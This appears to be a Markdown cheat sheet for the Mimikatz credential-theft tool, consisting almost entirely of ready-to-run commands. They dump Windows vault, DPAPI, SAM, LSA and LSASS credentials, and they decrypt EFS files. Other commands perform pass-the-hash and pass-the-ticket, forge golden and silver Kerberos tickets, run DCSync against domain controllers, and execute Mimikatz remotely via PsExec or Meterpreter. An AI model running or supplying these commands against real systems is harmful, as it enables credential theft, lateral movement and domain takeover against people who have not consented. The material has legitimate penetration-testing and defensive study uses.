# Mimikatz

# Author: https://github.com/gentilkiwi/mimikatz

## Miscellaneous

1) Shows privileges on machine ( Ensure output is "20 OK")

       privilege::debug

2) Impersonate SYSTEM

       token::elevate

De-escalate from SYSTEM

    token::revert

3) Altering LSASS Logic (Dump network share credentials, RDP passwords, etc. Not recommended.)

Prevent LSASS from checking the credential type

    sekurlsa::patch 

## Credentials Dumping

1) Windows Vault stored credentials dumping (passwords and authentication tokens)

       vault::cred

2) Web Credentials Dumping

       vault::list

3) Extract Credentials with DPAPI

        dpapi::cred /in"%appdata%\Microsoft\Credentials\85HJK6B5J456KJ46KJ546435H3JK"

#### If dwFlags includes CRYPTPROTECT_SYSTEM, the blob is protected by the system and cannot be decrypted by a standard user. The guidMasterKey indicates the necessary master key for decryption.

Extract the master key

        dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-341242153252-423423531651-2536513646524-1104\cc354534jkb534jb5-09f8-dd24-fe8fr798fed"

BONUS: RPC for Domain Controllers

#### Domain controllers can decrypt master keys for authorized users using the RPC service.

        dpapi::masterkey /in:"%appdata%\Microsoft\Protect\S-1-5-21-341242153252-423423531651-2536513646524-1104\cc354534jkb534jb5-09f8-dd24-fe8fr798fed" /rpc

Final decryption

        dpapi::cred /in"%appdata%\Microsoft\Credentials\85HJK6B5J456KJ46KJ546435H3JK"

4) Decrypt Encrypted File System (EFS) Files

Decrypting EFS files involves:

#### 1) Retrieving and exporting the necessary certificate

#### 2) Locating and exporting the associated private key

#### 3) Decrypting the master key using the user password

#### 4) Using the decrypted master key to decrypt the private key

#### 5) Applying the decrypted private key to access the encrypted file

### PREREQUISITES:

#### 1) Encrypted file(s) access on a Windows System

#### 2) User's systemCertificates, Crypto and Protect folders. Location:

       C:\Users\USERNAME\AppData\Roaming\Microsoft

#### 3) Master key or a way to decrypt it. It can be any of the following: User's password, SHA1, NTLM, Domain Backup Key or a memory dump. We will use a password for this example.

### STEPS:

##### 1) Get information about the encrypted file (Provides details like the certificate's fingerprint for example)

       cipher /c "C:\Users\USERNAME\Documents\encrypted.txt"

##### 2) Export the certificate (This command saves the certificate to a .der file)

       crypto::system /file:"C:\Users\USERNAME\AppData\Roaming\Microsoft\SystemCertificates\My\Certificates\G89ED7G8DF6G8DGDF9878GV98DF" /export

##### 3) Locate and export the Private Key

       dpapi::capi /in:"C:\Users\USERNAME\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-22353253535-164576453735-12352462464-1001\78fed6gf87edg687e6gg_e7fgegferger-jj54-dd09-214f-fwesfsefs"

#### TIP: Check if the pUniqueName field matches the container name from the certificate export step

##### 4) Decrypt the Master Key

       dpapi::masterkey /in:"C:\Users\USERNAME\AppData\Roaming\Microsoft\Protect\S-1-5-21-22353253535-164576453735-12352462464-1001\1oiknjui1jkhui-4771-4578-o90x-fefs89f7s9" /password:USERPASS

##### 5) Decrypt the Private Key

       dpapi::capi /masterkey:DECRYPTED_MASTERKEY /in:"C:\Users\USERNAME\AppData\Roaming\Microsoft\Crypto\RSA\S-1-5-21-22353253535-164576453735-12352462464-1001\78fed6gf87edg687e6gg_e7fgegferger-jj54-dd09-214f-fwesfsefs"

##### 6) Decrypt the EFS file (Use the decrypted key. This step may involve using additional tools or scripts to apply the private key and decrypt the file content)

5) Scheduled Tasks Credentials Dumping (Various Methods)

### 1: Vault Credentials Method

#### After creating a scheduled task, Windows stores a copy of the task credential in the owner's credential vault. Use mimikatz to dump them.

       vault::cred 

OR

       sekurlsa::credman 

OR 

       sekurlsa::logonpasswords

### 2: Elevating to SYSTEM

#### To access system credentials, elevate to SYSTEM and request the credentials.

       privilege::debug

       token::elevate

       vault::cred 

#### To expose the credential, use the patch option:

       vault::cred /patch

### 3: DPAPI Method

#### List the directory contents 

       dir /a %systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials

#### Decrypt the credential blob with Mimikatz

       dpapi::cred /in:"%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA89A7SDFASFDAS9879A87FD9C"

### 4: Extracting DPAPI Master Keys

#### Extract and use DPAPI master keys

       sekurlsa::dpapi

#### Use the master key to decrypt the credential blob

       dpapi::cred /in:"%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA89A7SDFASFDAS9879A87FD9C" /masterkey:35jknb65nj3k4b6jh43b6jhvb43jh6vhj45v64jh5kj37ghjh8g6jhg9j78hg9j6hjh645g63j535235i23kjh

### 5: Offline Method

#### To retrieve credentials offline, dump secrets from SYSTEM and SECURITY files

       lsadump::secrets /system:c:\temp\SYSTEM /security:c:\temp\SECURITY

#### Extract and decrypt master key

       dpapi::masterkey /in:"%systemroot%\System32\Microsoft\Protect\S-1-5-18\User\5n3j5hb-f998-ss09-24fd-ff53-4234235r235r2 /system:wf97s98f7wse98f7w9esf79we

#### Decrypt the credential blob

       dpapi::cred /in:"%systemroot%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\AA89A7SDFASFDAS9879A87FD9C"

## Kerberos

#### This module can operate without any special privileges and facilitates the creation of offline 'Golden Tickets;, which are long-duration TGT tickets for any user.

 1) Pass-the-Ticket (PtT)

#### Injects one or multiple Kerberos tickets into the current session 

### Arguments:

##### Filename = The ticket's filename (multiple can be used)

##### Directory = A directory path. All .kirbi files inside will be injected

       kerberos::ptt Administrator@krbtgt-WHATEVER.LOCAL.kirbi

 2) Golden/Silver

#### Creates Kerberos tickets (TGT or TGS) with arbitrary data for any user. 

### Arguments:

##### /domain = Fully Qualified Domain Name (FQDN)

##### /sid = SID of the domain (S-1-5-21-1342342452-45634534534543-253523534533)

##### /user = Username to impersonate

##### /id = User ID (Default UserID is 500 for administrator)

##### /groups = Group IDs the user belongs to  (comma-separated)

### Key Arguments:

##### /rc4 or /krbtgt = The NTLM Hash (krbtgt is golden ticket)

##### /aes128 = The AES128 key

##### /aes256 = The AES256 key

### Target and Service for Silver Ticket:

##### /target = Server/computer name where the service is hosted

##### /service = Service name for the ticket

### Target ticket:

##### /ticket = Filename for output (default is ticket.kirbi)

##### /ptt = Inject the golden ticket into the current session without saving to file

### Lifetime Arguments:

##### /startoffset = Start offset (in minutes)

##### /endin = Duration of the ticket (in minutes)

##### /renewmax = Maximum renewal duration (in minutes)

       kerberos::golden /user:USER_TO_IMPERSONATE /domain:DOMAIN.LOCAL /sid:SID_OF_THE_DOMAIN /krbtgt:KRBTGT_NTLM_HASH /id:USER_ID /groups:GROUP_ID_USER_BELONGS_TO /ticket:USER_TO_IMPERSONATE.DOMAIN.kirbi

3) tgt

#### Displays information about the TGT of the current session

       kerberos::tgt

4) list

#### Lists and exports Kerberos tickets (TGT and TGS) of the current session

### Arguments:

##### /export = Exports all tickets to files

       kerberos::list /export

5) purge

#### Purges all tickets of the current session

       kerberos::purge 

## Lsadump

#### Interact with LSA and SAM databases. It can extract password hashes, secrets and cached credentials.

### PREREQUISITES:

#### 1) Ensure you have the necessary privileges to run these commands, especially for sensitive operations.

#### 2) Backup your data before performing offline operations.

1) SAM

#### The sam command dumps the Security Account Manager (SAM) database. It contains NTLM and sometimes LM hashes of user passwords. The command can operate on both online and offline mode.

ONLINE MODE

### Requirements: SYSTEM privileges

       privilege::debug

       token::whoami

       token::elevate

Dump SAM

       lsadump::sam 

OFFLINE MODE

### Requirements: SYSTEM privileges and SAM hive files.

Backing up Hive files

       reg save HKLM\SYSTEM systembkup.hiv

       reg save HKLM\SAM sambkup.hiv

OR use Volume Shadow Copy or BootCD to backup these files

       C:\Windows\System32\config\SYSTEM
       C:\Windows\System32\config\SAM

Dump the hive files' content

       lsadump::sam /system:systembkup.hiv /sam:sambkup.hiv

2) Secrets

#### The secrets command extracts LSA secrets, which may contain sensitive information such as service account passwords.

Dump LSA (Service account passwords)

       lsadump::secrets

3) Cache

#### The cache command dumps cached domain credentials stored in LSA

Dump cached domain credentials

       lsadump::cache

4) LSA

#### The lsa command interacts with the LSA database to dump user information, including NTLM and Kerberos tickets.

Example 1 (Admin info):

       lsadump::lsa /id:500

Example 2 (Inject)

       lsadump::lsa /inject /name:krbtgt

Example 3 (Patch)

       lsadump::lsa /patch

5) Dcsync

#### The dcsync command uses the DRSR protocol to synchronize a specified entry from a domain controller, effeectively simulating the behavior of domain controllers during replication.

DCSync Attack

       lsadump::dcsync /domain:DOMAIN.LOCAL /user:Administrator

## Sekurlsa

#### Extract sensitive information such as passwords, keys, PIN codes and Kerberos Tickets from the memory of the Local Security Authority Subsystem Service (LSASS) process, or from a minidump of it.

### Requirements: Administrator privileges to acquire the debug priovilege via 

       privilege::debug

### OR SYSTEM access by any means.

1) Initial setup

       privilege::debug

       log sekurlsa.log

2) logonpasswords

#### Extracts all available logon passwords

       sekurlsa::logonpasswords

3) Pass-the-Hash (PtH)

#### Runs a process under another credential using the NTLM hash of a user's password

       sekurlsa::pth /user:Administrator /domain:DOMAIN.LOCAL /ntlm:NTLM_HASH

4) Tickets

#### Lists and exports Kerberos tickets of all sessions

       sekurlsa::tickets /export

5) Ekeys

#### Extracts encryption keys

       sekurlsa::ekeys

6) DPAPI

#### Extracts DPAPI keys

       sekurlsa::dpapi

7) Minidump

#### Loads a minidump for offline analysis

       sekurlsa::minidump lsass.dmp

##### 1) process = Switches the process context

##### 2) searchpasswords = Searches for passwords in memory

##### 3) msv = Lists MSV credentials

##### 4) wdigest = Lists WDigest credentials

##### 5) kerberos = Lists Kerberos credentials

Example of extracting logon passwords from a minidump:

       sekurlsa::minidump lsass.dmp

       sekurlsa::logonpasswords

### TIP: Starting with Windows 8.x and 10, passwords are NOT stored in memory by default. However, there are exceptions such as when the DC is unreachable or specific registry settings are configured to store credentials.

## Memory dump

### Dumps details of authentication session and associated credentials.

#### Memory dump formats:

##### 1) Minidump

##### 2) Full Dump

##### 3) Crashdump

##### 4) VMem and Other Raw Formats

##### 5) Hibernation File (hiberfil.sys)

### Each of these formats contains memory snapshots that can be analyzed to extract sensitive information such as passwords, keys, PIN code and tickets.

1) Minidump

       sekurlsa::minidump lsass.dmp

After loading the minidump, extract logon passwords

       sekurlsa::logonpasswords

2) Full Dump

       sekurlsa::full fulldump.dmp

Extract logon passwords

       sekurlsa::logonpasswords

3) Crashdump

       sekurlsa::crashdump crashdump.dmp

Then

       sekurlsa::logonpasswords

4) VMem and Other Raw Formats

       sekurlsa::vmem vmemdump.vmem

Then

       sekurlsa::logonpasswords

5) Hibernation File

       sekurlsa::hiberfil hiberfil.sys

Then

       sekurlsa::logonpasswords

## Remote Execution

### Remote execution with Mimikatz enables the execution of Mimikatz commands on remote systems to extract sensitive information such as passwords and credentials.

1) PsExec

       psexec \\REMOTE_COMPUTER_IP_OR_NAME -u USERNAME -p PASSWORD mimikatz.exe MIMIKATZ_COMMAND ARGUMENTS

2) Meterpreter

On a Meterpreter session, load the Mimikatz plugin

       load mimikatz

Execute Mmimikatz commands

       mimikatz_command ARGUMENTS

Example:

       mimikatz_command sekurlsa::logonpasswords

## Crypto Module

### Provides functionality similar to the certutil utility and includes capabilities for token impersonation, patching legacy CryptoAPI functions and modifying the CNG key isolation service.

List of valid system stores and available stores within them

       crypto::stores

Non-exportable keys may often be exported after using

       crypto::capi 

AND/OR

       crypto::cng 

### TIP: Ensure you have the correct ACL on the filesystem to access private keys. Some operations might require elevated privileges (UAC prompts for example)

### TIP 2: Smartcard crypto providers may sometimes falsely report successful private key exports.

1) providers

Lists all available providers, including CryptoAPI and CNG providers if available on NT 6

       crypto::providers

2) capi

Patches a CryptoAPI function within the Mimikatz process to make unexportable keys exportable. Useful for providers such as:

##### 1) Microsoft Base Cryptographic Provider v1.0

##### 2) Microsoft Enhanced Cryptographic Provider v1.0

##### 3) Microsoft Enhanced RSA and AES Cryptographic Provider

##### 4) Microsoft RSA SChannel Cryptographic Provider

##### 5) Microsoft Strong Cryptographic Provider

Usage:

       crypto::capi 

3) CNG

Modifies the KeyIso service in the LSASS process to make unexportable keys exportable. This is specifically useful for the Microsoft Software Key Storage Provider.

       privilege::Debug

       crypto::cng

